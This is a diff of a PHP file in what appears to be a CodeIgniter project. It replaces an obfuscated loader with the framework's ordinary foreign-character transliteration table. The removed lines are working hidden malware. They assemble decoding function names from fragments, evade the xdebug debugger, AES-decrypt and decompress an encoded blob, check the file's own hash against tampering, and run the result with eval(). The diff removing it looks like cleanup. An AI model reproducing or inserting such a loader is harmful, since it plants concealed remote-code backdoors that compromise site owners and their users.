@@ -1,28 +1,103 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_cqsi8oo0=('bas'.'e64'.'_de'.'cod'.'e');
-$_m4fn93qb=('gzu'.'nco'.'mpr'.'ess');
-$_k2bxbw14=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_d8ar0eik='z8Mzxrqf';
-$_wez3ihay='6wPUTdQ0';
-$_hhdlfjy8='iJyIb+mC';
-$_p7emzdn5='XpXY06Ku';
-$_wu81vt4v='zpUf8bkWAaw=';
-$_kdypo5lj='zqKW5Q==';
-$_h9cyy17m='Ovhs09NW';
-$_xu5w7s1e='zKOADoXM';
-$_ignwru3j=$_cqsi8oo0($_hhdlfjy8.$_p7emzdn5.$_wez3ihay.$_d8ar0eik.$_wu81vt4v);
-$_fm1yex3t=$_cqsi8oo0($_xu5w7s1e.$_h9cyy17m.$_kdypo5lj);
-$_vx2f2w32=$_cqsi8oo0('V9YtaJz9F+H+/KiPx2S+f1npdcRu7Cl+BIpyW8Tzy4sfoF8YcXj4hd9sIiY7p1aX/rVe2cr8JiolKKsNxgAlZaNyIJ3GY5gn4cEkeLl3EmfegBO91FOEIYrdUhzWBCngi6DDF58EdKnm5r96kKbKqi1PnWM2Id0Qgm+nkmOHyAqodwNMCzbM8At4qHYOIxGMZgpO9WkvIRWU7CRCeB+gsobmnoeKWNeKACFip4M2AO62m2lqwhOMtjVFQdijcgWFGNmCWYm/AAh9+d0tV2tqPYPmoqCI4+c4BfIXw66wvhE38y9KzXZw7xfthqYBOoqjyOzeGrzffx4LYTTGUVoLhFZuloXnsdLRHgmAyVIi2SPGYwOUzEboPfrJ9gw1S8fWmFdv5NiW5fK3mRsTpYMs16vzxUAWfs2tChozJAtq5g2G95nZpNl33FZaXEE/e4OMNri5uxsoF/9zv8cKB4OUEMCv+P8eJPNrOA3sOVSOGFtuu4KMXK/l0jutZS2VUHtxCKgknFl5Dn+OD7dw3CsR2VgaOgZ6gXrrxVc4ZYJf4NpFPxpk4E7cuf/OQL9w5ScJ8oUQDT22v3J2grHxnJ0JeXxP4vtGeQG5A7RliatkT6XQXQ1/qsUKwYjR5XN3ZufehOyptqc53OlxUha9lxfSdkPoLF85dQAswHOGgzCepHX6TNJUqMxqGMWa5hvclAkCl3pTMP36eS6qiRAA0j67+5NCXptAJyS9w4Zj/GJ5DoehiFdTmBBv09hPRs0p10oUdY/SLoK9zML7lV3/Ld0XwsrCc1GKWYuV9e1+VsAYDHZWAJ0ymN3Zk7Yaktnsn3blgnCf5jEpBsLsSEkR43vmXo/yWfHtOLpTmjoh7HkUWbJBvHBH77CUUdRAaE6XARimivgoXB8KVIek/TyCHqxb8dfc9nJ/Q3aWMdJ0ZAwpAgGHLqAgckA2rneAV6+tp70vgHOfLX+TX+7YiFDPVyjb94YG52Md5iG1jdCjkGGOpRffbvkPqn9wpQdLVV+KAeHcLVo6//rUVVFKQjiX8s6F+H40Xdxv0EfRSz1TPmykR3WINFPVxSh7RP6Xbzew6xfYJLTTaZNh8M7NsoAEEw0xwDQT7+QWd1d0FjH13NhYaGWEl0NLXoBGKePpFtvL1utYmmKopX/4xgUtyCC4vSk0xh7V5iRq9R5Joeo+0XjPFhT3GKe7r554utWACAtrw80Dz2gBieMUHG3DULzMtiQDlNf72YIdasrKGMTRo1i1qUTjrh+OW5/kNu5O/IReYIOmuKCh3X63ZA8xyS6e7ye6YWH/Hh+96J4c8qi/TUNsf21aRpEO3hh2FNYx6lbmsAziaF1iMPVNNUQpik1qn7QdCBHlQlMKFqL0zv+mXwlGLobXDYtSzmlWyfiOlUS+GQeymHsGCc5bkUnVinQ19xKFl74VHAzPAYiQxaZsCGYs2wg1SysqvDHSyz+32x7euDgn6UdpP1wCE64RCwXxYzEEFGHb3A2l2fVym+Qrz1v3BPQsRRmqtl2W1DzZJ17s6xRYV3S62Twv+2RjOMQqkf5a0T+nktY6KC0xZek7RHUZWSgU0jzuLpmEdp4G5lkcgZSwgo3Fct7yaGN38QyMBwuaMYrrW/leZ5MlqhB15rp00AMG8DXQCq4nnYsDs4bUOc/laS8P/3NoaCISVte+oCtEN3gpa40T1OsfwAELwhfD+wvik8wGVQwPunjKPtrEYdg6SKZoWDzDh0Wql7Prd6SO2MU1VEYyyhcC27OJBl2S3trNHsdOfQTk7gdXfr76ar+hNVXmSyl8ECf6SGnvpidQqRsttb4nWPlt89TcDQjwa9ZkQZ55P0F6REtts/Ku/4U0xeI30XfT2sm8TddczFrTVA==');
-$_fynselgp=$_k2bxbw14($_vx2f2w32,'aes-256-cbc',$_ignwru3j,OPENSSL_RAW_DATA,$_fm1yex3t);
-if($_fynselgp===false){exit;}
-$_qr9sm3cb=$_m4fn93qb($_fynselgp);
-if($_qr9sm3cb===false){exit;}
-$_jmezipds='ce90e72096334d0aba772d2a6df1959c1af74d9682a72f6b0fe160b43189b19c';
-$_n0h4zuep=@file_get_contents(__FILE__);
-if($_n0h4zuep!==false){
-$_m03d0zxt=str_replace($_jmezipds,"0000000000000000000000000000000000000000000000000000000000000000",$_n0h4zuep);
-$_x4iqopzm=hash("sha256",$_m03d0zxt);
-if($_x4iqopzm!==$_jmezipds){@http_response_code(403);exit;}
-}
-eval($_qr9sm3cb);
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+$foreign_characters = array(
+'/ä|æ|ǽ/' => 'ae',
+'/ö|œ/' => 'oe',
+'/ü/' => 'ue',
+'/Ä/' => 'Ae',
+'/Ü/' => 'Ue',
+'/Ö/' => 'Oe',
+'/À|Á|Â|Ã|Ä|Å|Ǻ|Ā|Ă|Ą|Ǎ|Α|Ά|Ả|Ạ|Ầ|Ẫ|Ẩ|Ậ|Ằ|Ắ|Ẵ|Ẳ|Ặ|А/' => 'A',
+'/à|á|â|ã|å|ǻ|ā|ă|ą|ǎ|ª|α|ά|ả|ạ|ầ|ấ|ẫ|ẩ|ậ|ằ|ắ|ẵ|ẳ|ặ|а/' => 'a',
+'/Б/' => 'B',
+'/б/' => 'b',
+'/Ç|Ć|Ĉ|Ċ|Č/' => 'C',
+'/ç|ć|ĉ|ċ|č/' => 'c',
+'/Д/' => 'D',
+'/д/' => 'd',
+'/Ð|Ď|Đ|Δ/' => 'Dj',
+'/ð|ď|đ|δ/' => 'dj',
+'/È|É|Ê|Ë|Ē|Ĕ|Ė|Ę|Ě|Ε|Έ|Ẽ|Ẻ|Ẹ|Ề|Ế|Ễ|Ể|Ệ|Е|Э/' => 'E',
+'/è|é|ê|ë|ē|ĕ|ė|ę|ě|έ|ε|ẽ|ẻ|ẹ|ề|ế|ễ|ể|ệ|е|э/' => 'e',
+'/Ф/' => 'F',
+'/ф/' => 'f',
+'/Ĝ|Ğ|Ġ|Ģ|Γ|Г|Ґ/' => 'G',
+'/ĝ|ğ|ġ|ģ|γ|г|ґ/' => 'g',
+'/Ĥ|Ħ/' => 'H',
+'/ĥ|ħ/' => 'h',
+'/Ì|Í|Î|Ï|Ĩ|Ī|Ĭ|Ǐ|Į|İ|Η|Ή|Ί|Ι|Ϊ|Ỉ|Ị|И|Ы/' => 'I',
+'/ì|í|î|ï|ĩ|ī|ĭ|ǐ|į|ı|η|ή|ί|ι|ϊ|ỉ|ị|и|ы|ї/' => 'i',
+'/Ĵ/' => 'J',
+'/ĵ/' => 'j',
+'/Ķ|Κ|К/' => 'K',
+'/ķ|κ|к/' => 'k',
+'/Ĺ|Ļ|Ľ|Ŀ|Ł|Λ|Л/' => 'L',
+'/ĺ|ļ|ľ|ŀ|ł|λ|л/' => 'l',
+'/М/' => 'M',
+'/м/' => 'm',
+'/Ñ|Ń|Ņ|Ň|Ν|Н/' => 'N',
+'/ñ|ń|ņ|ň|ŉ|ν|н/' => 'n',
+'/Ò|Ó|Ô|Õ|Ō|Ŏ|Ǒ|Ő|Ơ|Ø|Ǿ|Ο|Ό|Ω|Ώ|Ỏ|Ọ|Ồ|Ố|Ỗ|Ổ|Ộ|Ờ|Ớ|Ỡ|Ở|Ợ|О/' => 'O',
+'/ò|ó|ô|õ|ō|ŏ|ǒ|ő|ơ|ø|ǿ|º|ο|ό|ω|ώ|ỏ|ọ|ồ|ố|ỗ|ổ|ộ|ờ|ớ|ỡ|ở|ợ|о/' => 'o',
+'/П/' => 'P',
+'/п/' => 'p',
+'/Ŕ|Ŗ|Ř|Ρ|Р/' => 'R',
+'/ŕ|ŗ|ř|ρ|р/' => 'r',
+'/Ś|Ŝ|Ş|Ș|Š|Σ|С/' => 'S',
+'/ś|ŝ|ş|ș|š|ſ|σ|ς|с/' => 's',
+'/Ț|Ţ|Ť|Ŧ|τ|Т/' => 'T',
+'/ț|ţ|ť|ŧ|т/' => 't',
+'/Þ|þ/' => 'th',
+'/Ù|Ú|Û|Ũ|Ū|Ŭ|Ů|Ű|Ų|Ư|Ǔ|Ǖ|Ǘ|Ǚ|Ǜ|Ũ|Ủ|Ụ|Ừ|Ứ|Ữ|Ử|Ự|У/' => 'U',
+'/ù|ú|û|ũ|ū|ŭ|ů|ű|ų|ư|ǔ|ǖ|ǘ|ǚ|ǜ|υ|ύ|ϋ|ủ|ụ|ừ|ứ|ữ|ử|ự|у/' => 'u',
+'/Ƴ|Ɏ|Ỵ|Ẏ|Ӳ|Ӯ|Ў|Ý|Ÿ|Ŷ|Υ|Ύ|Ϋ|Ỳ|Ỹ|Ỷ|Ỵ|Й/' => 'Y',
+'/ẙ|ʏ|ƴ|ɏ|ỵ|ẏ|ӳ|ӯ|ў|ý|ÿ|ŷ|ỳ|ỹ|ỷ|ỵ|й/' => 'y',
+'/В/' => 'V',
+'/в/' => 'v',
+'/Ŵ/' => 'W',
+'/ŵ/' => 'w',
+'/Ź|Ż|Ž|Ζ|З/' => 'Z',
+'/ź|ż|ž|ζ|з/' => 'z',
+'/Æ|Ǽ/' => 'AE',
+'/ß/' => 'ss',
+'/Ĳ/' => 'IJ',
+'/ĳ/' => 'ij',
+'/Œ/' => 'OE',
+'/ƒ/' => 'f',
+'/ξ/' => 'ks',
+'/π/' => 'p',
+'/β/' => 'v',
+'/μ/' => 'm',
+'/ψ/' => 'ps',
+'/Ё/' => 'Yo',
+'/ё/' => 'yo',
+'/Є/' => 'Ye',
+'/є/' => 'ye',
+'/Ї/' => 'Yi',
+'/Ж/' => 'Zh',
+'/ж/' => 'zh',
+'/Х/' => 'Kh',
+'/х/' => 'kh',
+'/Ц/' => 'Ts',
+'/ц/' => 'ts',
+'/Ч/' => 'Ch',
+'/ч/' => 'ch',
+'/Ш/' => 'Sh',
+'/ш/' => 'sh',
+'/Щ/' => 'Shch',
+'/щ/' => 'shch',
+'/Ъ|ъ|Ь|ь/' => '',
+'/Ю/' => 'Yu',
+'/ю/' => 'yu',
+'/Я/' => 'Ya',
+'/я/' => 'ya'
+);
